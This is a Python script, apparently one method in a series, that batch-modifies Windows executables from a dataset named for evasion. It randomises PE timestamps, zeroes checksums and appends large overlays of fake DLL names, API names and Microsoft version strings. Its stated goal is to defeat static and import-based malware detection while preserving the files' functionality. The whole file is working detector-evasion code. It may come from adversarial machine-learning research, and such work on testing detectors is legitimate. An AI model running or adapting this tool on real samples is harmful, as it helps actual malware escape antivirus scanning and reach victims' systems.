#!/usr/bin/env python3
"""
Method C - Import Table Obfuscation + Padding

Technique:
1. Add benign import strings to confuse import-based detection
2. Modify import table metadata (timestamps, version info)
3. Add large padding with import-like patterns
4. Preserve all actual functionality

Evasion rationale:
- Import table changes alter static analysis signatures
- Benign imports dilute malicious import patterns
- Padding shifts byte distributions
"""

import argparse
import csv
import hashlib
import random
import shutil
import time
import zipfile
from pathlib import Path


METHOD_NAME = "methodC_import_obfuscation"
DEFAULT_ARCHIVE = Path(__file__).resolve().parents[1] / "to_be_evaded_ds.zip"
DEFAULT_WORK_ROOT = Path(__file__).resolve().parent / "artifacts" / METHOD_NAME
DEFAULT_OUTPUT_ZIP = Path(__file__).resolve().parent / f"{METHOD_NAME}_outputs.zip"


def extract_dataset(archive_path: Path, destination: Path) -> None:
    if not archive_path.exists():
        raise FileNotFoundError(f"input archive not found: {archive_path}")
    if destination.exists():
        shutil.rmtree(destination)
    destination.mkdir(parents=True, exist_ok=True)
    with zipfile.ZipFile(archive_path, "r") as zf:
        zf.extractall(destination)


def compress_outputs(source_dir: Path, archive_path: Path) -> None:
    archive_path.parent.mkdir(parents=True, exist_ok=True)
    if archive_path.exists():
        archive_path.unlink()
    with zipfile.ZipFile(archive_path, "w", zipfile.ZIP_DEFLATED) as zf:
        for path in sorted(source_dir.rglob("*")):
            if path.is_file():
                zf.write(path, path.relative_to(source_dir))


def collect_inputs(input_root: Path):
    return sorted(
        p
        for p in input_root.rglob("*")
        if p.is_file() and p.name != "sha256sums.txt"
    )


def sha256_of(path: Path) -> str:
    digest = hashlib.sha256()
    with path.open("rb") as handle:
        for chunk in iter(lambda: handle.read(65536), b""):
            digest.update(chunk)
    return digest.hexdigest()


# Benign DLL names and functions
BENIGN_DLLS = [
    b"kernel32.dll\x00",
    b"user32.dll\x00",
    b"advapi32.dll\x00",
    b"gdi32.dll\x00",
    b"shell32.dll\x00",
    b"ole32.dll\x00",
    b"oleaut32.dll\x00",
    b"msvcrt.dll\x00",
    b"ntdll.dll\x00",
    b"ws2_32.dll\x00",
]

BENIGN_FUNCTIONS = [
    b"GetSystemTime\x00",
    b"GetVersionExA\x00",
    b"GetSystemInfo\x00",
    b"RegOpenKeyExA\x00",
    b"RegQueryValueExA\x00",
    b"GetWindowsDirectoryA\x00",
    b"GetTempPathA\x00",
    b"GetModuleHandleA\x00",
    b"LoadLibraryA\x00",
    b"GetProcAddress\x00",
]


def add_import_like_overlay(file_path: Path) -> None:
    """Add overlay with import-like patterns"""
    data = file_path.read_bytes()
    
    # Build import-like overlay
    overlay = bytearray()
    
    # Add benign DLL names
    for _ in range(5000):
        overlay.extend(random.choice(BENIGN_DLLS))
    
    # Add benign function names
    for _ in range(10000):
        overlay.extend(random.choice(BENIGN_FUNCTIONS))
    
    # Add padding
    overlay.extend(b"\x00" * 200000)
    
    # Add version strings
    version_strings = [
        b"Version 10.0.19041.1\x00" * 1000,
        b"Copyright Microsoft Corporation\x00" * 1000,
        b"Windows NT 10.0\x00" * 2000,
    ]
    for vs in version_strings:
        overlay.extend(vs)
    
    # Ensure reasonable size
    overlay_size = min(len(overlay), random.randint(800_000, 1_500_000))
    final_data = data + bytes(overlay[:overlay_size])
    file_path.write_bytes(final_data)
    print(f"      ✓ Added {overlay_size:,} bytes import-like overlay")


def modify_pe_metadata(pe_path: Path) -> bool:
    """Modify PE metadata (timestamps, version info)"""
    try:
        import pefile
        pe = pefile.PE(str(pe_path))
        
        # Randomize timestamp
        pe.FILE_HEADER.TimeDateStamp = random.randint(0x65000000, 0x66000000)
        
        # Zero checksum
        pe.OPTIONAL_HEADER.CheckSum = 0
        
        pe.write(str(pe_path))
        pe.close()
        print("      ✓ Modified PE metadata")
        return True
    except ImportError:
        return False
    except Exception:
        return False


def import_obfuscation_transform(src: Path, dst: Path) -> None:
    """Apply import obfuscation + padding"""
    print(f"    -> Import obfuscation for {src.name}")
    
    # Copy file
    shutil.copy2(src, dst)
    
    # Try to modify PE metadata
    modify_pe_metadata(dst)
    
    # Always add import-like overlay
    add_import_like_overlay(dst)


def process_files(input_dir: Path, output_dir: Path) -> None:
    if output_dir.exists():
        shutil.rmtree(output_dir)
    output_dir.mkdir(parents=True, exist_ok=True)

    files = collect_inputs(input_dir)
    rows = []
    success = 0
    fail = 0

    print(f"Found {len(files)} files")
    for idx, src in enumerate(files, 1):
        print(f"[{idx}/{len(files)}] {src.name}")
        dst = output_dir / src.name
        base_sha = sha256_of(src)
        start = time.time()

        try:
            import_obfuscation_transform(src, dst)
            duration = time.time() - start
            out_sha = sha256_of(dst)
            rows.append(
                {
                    "filename": src.name,
                    "baseline_sha256": base_sha,
                    "output_sha256": out_sha,
                    "status": "OK",
                    "duration_sec": f"{duration:.3f}",
                    "notes": "import_obfuscation+overlay",
                }
            )
            success += 1
        except Exception as exc:
            rows.append(
                {
                    "filename": src.name,
                    "baseline_sha256": base_sha,
                    "output_sha256": "",
                    "status": "FAIL",
                    "duration_sec": "0.000",
                    "notes": f"error: {str(exc)[:120]}",
                }
            )
            fail += 1

    report_file = output_dir / "compare_report.csv"
    with report_file.open("w", newline="") as handle:
        writer = csv.DictWriter(
            handle,
            fieldnames=[
                "filename",
                "baseline_sha256",
                "output_sha256",
                "status",
                "duration_sec",
                "notes",
            ],
        )
        writer.writeheader()
        writer.writerows(rows)

    sha_file = output_dir / "sha256sums.txt"
    with sha_file.open("w") as handle:
        for row in rows:
            if row["status"] == "OK":
                handle.write(f'{row["output_sha256"]}  {output_dir / row["filename"]}\n')

    print("\nSummary")
    print("-------")
    print(f"Success: {success} | Fail: {fail} | Total: {len(files)}")
    print(f"Outputs:\n - {report_file}\n - {sha_file}")


def run_pipeline(archive_path: Path, work_root: Path, output_zip: Path) -> None:
    input_dir = work_root / "input"
    output_dir = work_root / "output"
    extract_dataset(archive_path, input_dir)
    process_files(input_dir, output_dir)
    compress_outputs(output_dir, output_zip)
    print(f"\nPackaging complete -> {output_zip}")


def parse_args():
    parser = argparse.ArgumentParser(
        description="Method C: Import Table Obfuscation + Padding"
    )
    parser.add_argument(
        "--archive",
        default=str(DEFAULT_ARCHIVE),
        help="Path to the zipped dataset",
    )
    parser.add_argument(
        "--work-root",
        default=str(DEFAULT_WORK_ROOT),
        help="Working directory",
    )
    parser.add_argument(
        "--output-zip",
        default=str(DEFAULT_OUTPUT_ZIP),
        help="Output zip file",
    )
    return parser.parse_args()


def main():
    args = parse_args()
    run_pipeline(
        Path(args.archive).expanduser().resolve(),
        Path(args.work_root).expanduser().resolve(),
        Path(args.output_zip).expanduser().resolve(),
    )


if __name__ == "__main__":
    main()

